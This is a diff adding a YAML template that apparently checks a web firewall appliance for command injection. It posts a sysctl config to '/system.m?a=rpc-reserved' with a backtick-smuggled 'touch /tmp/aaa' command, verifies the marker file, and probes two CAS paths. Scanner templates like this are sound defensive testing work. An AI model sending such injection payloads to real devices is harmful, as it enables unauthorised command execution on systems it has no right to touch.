@@ -1,0 +1,26 @@
+---
+  inject_cfg:
+    protocol: 'https://'
+    method: post
+    path: '/system.m?a=rpc-reserved'
+    cookie: True
+    body: 'configs={"sysctl":{"a":{"0":"`touch /tmp/aaa`","1":"64888"}}}'
+    header:
+      Content-Type: 'application/x-www-form-urlencoded'
+      Accept: '*/*'
+    cmd: 'ls /tmp/aaa; echo $?; rm -f /tmp/aaa'
+    check_value: 0
+    judg: in
+    cookie_name: 'WAFFSSID'
+
+  cas_cfg1:
+    protocol: 'https://'
+    method: get
+    path: '/cas.m'
+    rsp_code: 404
+  
+  cas_cfg2:
+    protocol: 'https://'
+    method: get
+    path: '/main.m?m=_cas.m'
+    rsp_code: 404
